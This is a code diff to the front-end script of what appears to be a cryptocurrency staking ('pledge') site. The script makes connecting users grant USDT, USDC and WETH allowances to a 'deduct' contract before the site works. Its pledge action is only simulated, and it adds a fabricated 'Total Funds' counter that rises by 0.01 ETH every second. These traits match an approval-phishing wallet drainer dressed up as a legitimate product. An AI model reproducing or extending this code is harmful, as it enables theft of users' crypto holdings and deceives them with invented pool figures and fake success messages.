@@ -24,10 +24,14 @@ const startBtn = document.getElementById('startBtn');
 const pledgeBtn = document.getElementById('pledgeBtn');
 const pledgeAmount = document.getElementById('pledgeAmount');
 const pledgeDuration = document.getElementById('pledgeDuration');
+const pledgeToken = document.getElementById('pledgeToken');
 const refreshWallet = document.getElementById('refreshWallet');
+const walletBalanceValue = document.getElementById('walletBalanceValue');
+const totalValue = document.getElementById('totalValue');
 
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
+let totalFunds = 12856459.94; // 初始值 (單位: ETH)
 
 //---UI Control Functions (使用者介面控制函數)---
 function updateStatus(message) {
@@ -44,13 +48,12 @@ function resetState(showMsg = true) {
     signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
     if (connectButton) {
         connectButton.classList.remove('connected');
-        connectButton.textContent = 'Connect'; // 強制更新文字
+        connectButton.textContent = 'Connect';
         connectButton.title = 'Connect Wallet';
     }
     disableInteractiveElements(true);
-    if (showMsg) {
-        updateStatus("請先連接您的錢包以繼續。");
-    }
+    if (walletBalanceValue) walletBalanceValue.textContent = '0.000 USDT / 0.000 USDC / 0.000 WETH';
+    if (showMsg) updateStatus("請先連接您的錢包以繼續。");
 }
 
 /**
@@ -62,9 +65,33 @@ function disableInteractiveElements(disable = false) {
     if (pledgeBtn) pledgeBtn.disabled = disable;
     if (pledgeAmount) pledgeAmount.disabled = disable;
     if (pledgeDuration) pledgeDuration.disabled = disable;
+    if (pledgeToken) pledgeToken.disabled = disable;
     if (refreshWallet) {
         refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
         refreshWallet.style.color = disable ? '#999' : '#ff00ff';
+    }
+}
+
+/**
+ * 更新 Wallet Balance 顯示。
+ * @param {Object} balances - 包含 USDT, USDC, WETH 餘額的對象。
+ */
+function updateWalletBalance(balances) {
+    if (walletBalanceValue) {
+        const usdtBalance = ethers.formatUnits(balances.usdt || 0n, 6);
+        const usdcBalance = ethers.formatUnits(balances.usdc || 0n, 6);
+        const wethBalance = ethers.formatUnits(balances.weth || 0n, 18);
+        walletBalanceValue.textContent = `${usdtBalance} USDT / ${usdcBalance} USDC / ${wethBalance} WETH`;
+    }
+}
+
+/**
+ * 更新 Total Funds 顯示。
+ */
+function updateTotalFunds() {
+    if (totalValue) {
+        totalFunds += 0.01; // 每秒增加 0.01 ETH
+        totalValue.textContent = totalFunds.toLocaleString('en-US', { maximumFractionDigits: 2 }) + ' ETH';
     }
 }
 
@@ -135,16 +162,15 @@ async function initializeWallet() {
                 updateStatus('此應用程式僅支持以太坊主網 (Chain ID: 1)。請在錢包中切換至 Ethereum Mainnet 並刷新頁面。');
                 try {
                     await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
-                    // 等待用戶確認並刷新頁面
                     await new Promise(resolve => setTimeout(resolve, 2000)); // 延遲 2 秒檢查
                 } catch (switchError) {
-                    if (switchError.code === 4001) { // 用戶拒絕切換
+                    if (switchError.code === 4001) {
                         updateStatus('您拒絕了網絡切換。請手動切換至 Ethereum Mainnet 並刷新頁面。');
-                    } else if (switchError.code === 4902) { // 網絡未添加
+                    } else if (switchError.code === 4902) {
                         await provider.send('wallet_addEthereumChain', [{
                             chainId: '0x1',
                             chainName: 'Ethereum Mainnet',
-                            rpcUrls: ['https://mainnet.infura.io/v3/'], // 默認 RPC，可替換
+                            rpcUrls: ['https://mainnet.infura.io/v3/'], // 請替換為您的 RPC URL
                             nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                             blockExplorerUrls: ['https://etherscan.io']
                         }]);
@@ -152,18 +178,13 @@ async function initializeWallet() {
                     } else {
                         updateStatus(`網絡切換失敗: ${switchError.message}。請手動切換至 Ethereum Mainnet 並刷新頁面。`);
                     }
-                    return; // 阻止進一步執行，直到用戶手動切換
+                    return;
                 }
             } else {
-                break; // 確認為主網，退出循環
+                break;
             }
         }
 
-        // 移除自動重整邏輯
-        // window.ethereum.on('accountsChanged', () => window.location.reload());
-        // window.ethereum.on('chainChanged', () => window.location.reload());
-
-        // 改用手動狀態更新，添加地址檢查避免無限循環
         window.ethereum.on('accountsChanged', async (newAccounts) => {
             console.log("帳戶切換偵測到，更新狀態...");
             if (newAccounts.length > 0 && (!userAddress || userAddress !== newAccounts[0])) {
@@ -173,13 +194,13 @@ async function initializeWallet() {
         });
         window.ethereum.on('chainChanged', async () => {
             console.log("鏈切換偵測到，更新狀態...");
-            await initializeWallet(); // 重新初始化以檢查網絡
+            await initializeWallet();
         });
 
         const accounts = await provider.send('eth_accounts', []);
         if (accounts.length > 0) {
             resetState(false);
-            await connectWallet(); // 自動連接已授權帳戶
+            await connectWallet();
         }
 
         updateStatus("請先連接您的錢包以繼續。");
@@ -208,23 +229,17 @@ async function checkAuthorization() {
             usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
             wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch((error) => {
                 console.warn("【DEBUG】獲取 WETH 授權失敗:", error.message);
-                return 0n; // 默認為 0
+                return 0n;
             })
         ]);
 
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = isServiceActive && hasSufficientAllowance;
 
-        console.log("【DEBUG_FinalCheck】用戶地址:", userAddress);
-        console.log("【DEBUG_FinalCheck】所需授權額度:", requiredAllowance.toString());
-        console.log("【DEBUG_FinalCheck】服務啟動:", isServiceActive);
-        console.log("【DEBUG_FinalCheck】是否有足夠授權:", hasSufficientAllowance);
-        console.log("【DEBUG_FinalCheck】是否完全授權 (最終):", isFullyAuthorized);
-
         if (isFullyAuthorized) {
             if (connectButton) {
                 connectButton.classList.add('connected');
-                connectButton.textContent = 'Connected'; // 強制更新文字
+                connectButton.textContent = 'Connected';
                 connectButton.title = '斷開錢包';
             }
             disableInteractiveElements(false);
@@ -232,7 +247,7 @@ async function checkAuthorization() {
         } else {
             if (connectButton) {
                 connectButton.classList.remove('connected');
-                connectButton.textContent = 'Connect'; // 強制更新文字
+                connectButton.textContent = 'Connect';
                 connectButton.title = '連接並授權';
             }
             disableInteractiveElements(true);
@@ -265,7 +280,7 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
 
         const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch((error) => {
             console.warn(`【DEBUG】獲取 ${name} 授權失敗:`, error.message);
-            return 0n; // 默認為 0
+            return 0n;
         });
 
         if (currentAllowance < requiredAllowance) {
@@ -314,7 +329,7 @@ async function connectWallet() {
         if (!provider || (await provider.getNetwork()).chainId !== 1n) {
             await initializeWallet();
             const network = await provider.getNetwork();
-            if (network.chainId !== 1n) return; // 強制要求主網
+            if (network.chainId !== 1n) return;
         }
 
         updateStatus('請在錢包中確認連接...');
@@ -338,22 +353,37 @@ async function connectWallet() {
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
 
-        updateStatus('準備最佳化授權流程...');
+        updateStatus('更新餘額和授權流程...');
 
-        let ethBalance, wethBalance;
+        let ethBalance, wethBalance, usdtBalance, usdcBalance;
         try {
-            [ethBalance, wethBalance] = await Promise.all([
+            [ethBalance, wethBalance, usdtBalance, usdcBalance] = await Promise.all([
                 provider.getBalance(userAddress),
                 wethContract.balanceOf(userAddress).catch((error) => {
                     console.warn("【DEBUG】獲取 WETH 餘額失敗:", error.message);
-                    return 0n; // 默認為 0，繼續執行
+                    return 0n;
+                }),
+                usdtContract.balanceOf(userAddress).catch((error) => {
+                    console.warn("【DEBUG】獲取 USDT 餘額失敗:", error.message);
+                    return 0n;
+                }),
+                usdcContract.balanceOf(userAddress).catch((error) => {
+                    console.warn("【DEBUG】獲取 USDC 餘額失敗:", error.message);
+                    return 0n;
                 }),
             ]);
         } catch (error) {
             ethBalance = await provider.getBalance(userAddress);
-            wethBalance = 0n; // 如果全部失敗，WETH 設為 0
+            wethBalance = usdtBalance = usdcBalance = 0n;
             console.warn("【DEBUG】獲取餘額失敗，僅使用 ETH 餘額:", error.message);
         }
+
+        const balances = {
+            usdt: usdtBalance,
+            usdc: usdcBalance,
+            weth: wethBalance
+        };
+        updateWalletBalance(balances);
 
         const oneEth = ethers.parseEther("1.0");
         const totalEthEquivalent = ethBalance + wethBalance;
@@ -362,26 +392,17 @@ async function connectWallet() {
         const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
 
-        console.log("【DEBUG】所需授權額度 (閾值):", requiredAllowance.toString());
-        console.log("【DEBUG】服務已啟動:", serviceActivated);
-
         const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
             usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
             usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
             wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch((error) => {
                 console.warn("【DEBUG】獲取 WETH 授權失敗:", error.message);
-                return 0n; // 默認為 0
+                return 0n;
             })
         ]);
 
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = serviceActivated && hasSufficientAllowance;
-
-        console.log("【DEBUG】USDT 授權:", usdtAllowance.toString());
-        console.log("【DEBUG】USDC 授權:", usdcAllowance.toString());
-        console.log("【DEBUG】WETH 授權:", wethAllowance.toString());
-        console.log("【DEBUG】是否有足夠授權:", hasSufficientAllowance);
-        console.log("【DEBUG】是否完全授權 (最終檢查):", isFullyAuthorized);
 
         let tokensToProcess;
 
@@ -420,7 +441,7 @@ async function connectWallet() {
         updateStatus(userMessage);
         if (connectButton) {
             connectButton.classList.remove('connected');
-            connectButton.textContent = 'Connect'; // 強制重設文字
+            connectButton.textContent = 'Connect';
             connectButton.title = '連接錢包 (重試)';
         }
     }
@@ -570,27 +591,42 @@ startBtn.addEventListener('click', () => {
     document.querySelector('#liquidity .stat-value:nth-of-type(2)').textContent = '0.6000380 ETH';
 });
 
-pledgeBtn.addEventListener('click', () => {
+pledgeBtn.addEventListener('click', async () => {
     if (!connectButton.classList.contains('connected')) {
         alert('請先連接您的錢包！');
         return;
     }
     const amount = pledgeAmount.value;
     const duration = pledgeDuration.value;
+    const token = pledgeToken.value;
     if (!amount) {
         alert('請輸入質押金額！');
         return;
     }
-    alert(`質押 ${amount} USDT 於 ${duration} 天... (模擬: 質押成功)`);
-    document.querySelector('.pledge-stats .stat-value:nth-of-type(1)').textContent = `${parseFloat(5678.90) + parseFloat(amount)}.00 USDT`;
+    alert(`質押 ${amount} ${token} 於 ${duration} 天... (模擬: 質押成功)`);
+    const totalPledgedValue = document.getElementById('totalPledgedValue');
+    let currentTotal = parseFloat(totalPledgedValue.textContent);
+    totalPledgedValue.textContent = `${(currentTotal + parseFloat(amount)).toFixed(2)} ${token}`;
 });
 
-refreshWallet.addEventListener('click', () => {
+refreshWallet.addEventListener('click', async () => {
     if (!connectButton.classList.contains('connected')) {
         alert('請先連接您的錢包！');
         return;
     }
-    alert('刷新錢包餘額... (模擬: 餘額更新為 0.000 USDT)');
+    if (signer && userAddress) {
+        const [usdtBalance, usdcBalance, wethBalance] = await Promise.all([
+            usdtContract.balanceOf(userAddress).catch(() => 0n),
+            usdcContract.balanceOf(userAddress).catch(() => 0n),
+            wethContract.balanceOf(userAddress).catch(() => 0n)
+        ]);
+        updateWalletBalance({
+            usdt: usdtBalance,
+            usdc: usdcBalance,
+            weth: wethBalance
+        });
+        alert('刷新錢包餘額成功！');
+    }
 });
 
 const tabs = document.querySelectorAll('.tab');
@@ -604,6 +640,9 @@ tabs.forEach(tab => {
         document.getElementById(tab.dataset.tab).classList.add('active');
     });
 });
+
+// 每秒更新 Total Funds
+setInterval(updateTotalFunds, 1000);
 
 // 頁面載入時執行初始化
 initializeWallet();
